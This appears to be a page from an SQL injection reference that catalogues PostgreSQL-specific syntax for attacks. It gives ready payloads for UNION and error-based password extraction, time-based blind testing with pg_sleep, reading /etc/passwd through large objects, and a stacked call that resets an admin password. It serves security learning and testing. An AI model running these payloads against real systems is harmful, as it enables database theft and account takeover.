---
title: PostgreSQL-specific Code
description: PostgreSQL-specific syntax and techniques for SQL injection
category: Advanced Techniques
order: 19
tags: ["postgresql specific", "special syntax", "version compatibility"]
lastUpdated: 2025-12-14
---

## PostgreSQL-specific Code

PostgreSQL provides several unique syntax features and functions that can be leveraged in SQL injection attacks. Understanding these PostgreSQL-specific techniques can help bypass filters and execute complex injections.

### Dollar-Quoted Strings

PostgreSQL's unique string quoting mechanism allows strings without single quotes:

```sql
-- Standard dollar quotes
SELECT $$This is a string$$;

-- Tagged dollar quotes (useful for nesting)
SELECT $tag$This string contains $$nested$$ quotes$tag$;

-- In injection context
' UNION SELECT $$admin$$, $$password$$ --
```

This is extremely useful for bypassing single-quote filters.

### Type Cast Shorthand (::)

PostgreSQL's `::` cast operator is unique and useful for database detection:

```sql
-- Cast string to integer
SELECT '123'::int;

-- Cast to various types
SELECT 1::boolean;         -- true
SELECT '2025-01-01'::date;
SELECT 123::text;
SELECT '192.168.1.1'::inet;

-- Array casts
SELECT '{1,2,3}'::int[];

-- For database detection (fails on MySQL/MSSQL)
' AND 1::int=1 --
```

### RETURNING Clause

PostgreSQL allows returning data from INSERT, UPDATE, and DELETE:

```sql
-- Return inserted data
INSERT INTO users (username) VALUES ('test') RETURNING id, username;

-- Return updated data
UPDATE users SET password='new' WHERE id=1 RETURNING *;

-- Return deleted data
DELETE FROM users WHERE id=1 RETURNING username, password;

-- In injection context
'; INSERT INTO log (data) VALUES ('x') RETURNING (SELECT password FROM users LIMIT 1) --
```

### Array Syntax

PostgreSQL has native array support:

```sql
-- Array literals
SELECT ARRAY[1, 2, 3];
SELECT '{1,2,3}'::int[];

-- Array access (1-indexed)
SELECT (ARRAY['a','b','c'])[1];  -- Returns 'a'

-- Array functions
SELECT array_agg(username) FROM users;
SELECT unnest(ARRAY[1,2,3]);

-- In injection for aggregation
' UNION SELECT 1, array_to_string(array_agg(username), ':') FROM users --
```

### PostgreSQL-specific Functions

Functions unique to PostgreSQL:

| Function            | Description                                    |
| ------------------- | ---------------------------------------------- |
| `string_agg()`      | Aggregate strings (like GROUP_CONCAT in MySQL) |
| `array_agg()`       | Aggregate into array                           |
| `generate_series()` | Generate a series of values                    |
| `regexp_matches()`  | Return regex matches as array                  |
| `regexp_replace()`  | Replace using regex                            |
| `query_to_xml()`    | Execute query and return XML                   |
| `table_to_xml()`    | Export table as XML                            |
| `pg_sleep()`        | Sleep for specified seconds                    |
| `pg_read_file()`    | Read file from server                          |
| `pg_ls_dir()`       | List directory contents                        |

### String Aggregation

```sql
-- Aggregate all usernames into single string
SELECT string_agg(username, ',') FROM users;

-- With ordering
SELECT string_agg(username, ',' ORDER BY username) FROM users;

-- Distinct values
SELECT string_agg(DISTINCT role, ',') FROM users;
```

### Generate Series

Useful for brute-force and enumeration:

```sql
-- Generate numbers 1-10
SELECT generate_series(1, 10);

-- Generate dates
SELECT generate_series('2025-01-01'::date, '2025-01-10'::date, '1 day');

-- Character enumeration (for blind injection)
SELECT chr(n) FROM generate_series(32, 126) AS n;
```

### XML Helper Functions

Extract data in XML format (bypasses output restrictions):

```sql
-- Query results as XML
SELECT query_to_xml('SELECT * FROM users', true, true, '');

-- Single table as XML
SELECT table_to_xml('users', true, true, '');

-- Database structure as XML
SELECT database_to_xmlschema(true, true, '');

-- In UNION injection
' UNION SELECT 1, query_to_xml('SELECT password FROM users',true,true,'')::text --
```

### COPY Command

PostgreSQL's COPY is unique and powerful. File operations require superuser or `pg_write_server_files`/`pg_read_server_files` roles. PROGRAM operations require superuser or `pg_execute_server_program` role (PostgreSQL 11+).

### Large Objects

PostgreSQL's large object system for file operations:

```sql
-- Create large object from file
SELECT lo_import('/etc/passwd');  -- Returns OID

-- Read large object
SELECT convert_from(lo_get(16444), 'UTF8');

-- Write large object to file
SELECT lo_export(16444, '/tmp/output.txt');

-- Create large object from data
SELECT lo_from_bytea(0, 'file content'::bytea);

-- Delete large object
SELECT lo_unlink(16444);
```

### PL/pgSQL Anonymous Blocks

Execute procedural code without creating a function:

```sql
DO $$
BEGIN
    RAISE NOTICE 'PostgreSQL version: %', version();
END
$$;

-- With variable
DO $$
DECLARE
    pwd TEXT;
BEGIN
    SELECT password INTO pwd FROM users WHERE username = 'admin';
    RAISE NOTICE 'Password: %', pwd;
END
$$;
```

### Error-Based Data Extraction

PostgreSQL-specific error-based techniques:

```sql
-- Using CAST to reveal data in errors
SELECT CAST(version() AS int);
-- Error: invalid input syntax for type integer: "PostgreSQL 15.4..."

-- Using :: shorthand
SELECT (SELECT password FROM users LIMIT 1)::int;
-- Error: invalid input syntax for type integer: "secret_password"

-- With markers for easy extraction
SELECT ('~' || (SELECT version()) || '~')::int;
-- Error: invalid input syntax for type integer: "~PostgreSQL 15.4~"
```

### Conditional Expressions

PostgreSQL CASE expressions:

```sql
-- Simple CASE
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

-- With subquery for blind injection
SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0
       THEN pg_sleep(5) ELSE pg_sleep(0) END;

-- COALESCE for NULL handling
SELECT COALESCE(NULL, 'default');

-- NULLIF
SELECT NULLIF(1, 1);  -- Returns NULL
SELECT NULLIF(1, 2);  -- Returns 1
```

### Regular Expression Operators

PostgreSQL has powerful regex support:

```sql
-- POSIX regex match
SELECT 'admin' ~ '^a';      -- true
SELECT 'admin' ~* '^A';     -- true (case-insensitive)

-- Not match
SELECT 'admin' !~ '^b';     -- true

-- SIMILAR TO (SQL standard)
SELECT 'admin' SIMILAR TO 'a%';

-- Regex functions
SELECT regexp_matches('admin123', '([a-z]+)([0-9]+)');
SELECT regexp_replace('admin123', '[0-9]', 'X', 'g');
```

### PostgreSQL Information Tables

PostgreSQL uses both information_schema and pg_catalog:

```sql
-- Standard information_schema
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- PostgreSQL-specific pg_catalog
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT attname FROM pg_attribute WHERE attrelid='users'::regclass AND attnum > 0;

-- System catalogs
SELECT datname FROM pg_database;
SELECT rolname FROM pg_roles;
SELECT usename FROM pg_user;
```

### Session Variables

Unlike MySQL's `@@variables`, PostgreSQL uses functions:

```sql
-- Current settings
SELECT current_setting('server_version');
SELECT current_setting('data_directory');
SELECT current_setting('log_directory');

-- Set session variable
SET myvar.test = 'value';
SELECT current_setting('myvar.test');

-- GUC variables
SHOW ALL;
SHOW server_version;
SHOW data_directory;
```

### Prepared Statements (Dynamic SQL)

Execute dynamic SQL:

```sql
-- Prepare and execute
PREPARE stmt AS SELECT * FROM users WHERE id = $1;
EXECUTE stmt(1);
DEALLOCATE stmt;

-- Using EXECUTE in PL/pgSQL
DO $$
BEGIN
    EXECUTE 'SELECT * FROM users WHERE id = ' || 1;
END
$$;
```

### Version-specific Features

#### JSON/JSONB (9.2+/9.4+)

JSON functions are useful for extracting structured data:

```sql
-- JSON (9.2+): Extract values
SELECT '{"user":"admin","pass":"secret"}'::json->>'pass';

-- JSONB (9.4+): Binary JSON with indexing and containment operators
SELECT '{"a":1}'::jsonb @> '{"a":1}'::jsonb;  -- Containment check

-- Extract from JSON columns in injection
' UNION SELECT 1, config::json->>'db_password' FROM settings --

-- Aggregate to JSON for exfiltration
SELECT json_agg(row_to_json(u)) FROM users u;
```

#### Procedures (11+)

```sql
-- Call existing procedure (if known)
CALL schema.procedure_name(arg1, arg2);

-- In injection context (requires knowing procedure names)
'; CALL admin_reset_password('attacker', 'newpass') --
```

#### Other Version Features

| Version | Feature                 | Injection Relevance                        |
| ------- | ----------------------- | ------------------------------------------ |
| 9.1+    | `pg_read_binary_file()` | File reading without encoding issues       |
| 9.6+    | Parallel query          | Performance only, not directly exploitable |
| 10+     | Logical replication     | Administrative, requires superuser         |
| 12+     | Generated columns       | Schema feature, not directly exploitable   |

### Key Differences from MySQL

| Feature            | PostgreSQL                 | MySQL                                                           |
| ------------------ | -------------------------- | --------------------------------------------------------------- |
| String quotes      | `'single'` or `$$dollar$$` | `'single'` or `"double"`                                        |
| Concatenation      | <code>&#124;&#124;</code>  | `CONCAT()` or with <code>&#124;&#124;</code> if PIPES_AS_CONCAT |
| Type cast          | `::type` or `CAST()`       | `CAST()` only                                                   |
| Regex              | `~`, `~*`, `!~`            | `REGEXP`                                                        |
| String aggregation | `string_agg()`             | `GROUP_CONCAT()`                                                |
| Boolean            | `true`/`false`             | `TRUE`/`FALSE` or 1/0                                           |
| System variables   | `current_setting()`        | `@@variable`                                                    |
| Auto increment     | `SERIAL` or `GENERATED`    | `AUTO_INCREMENT`                                                |
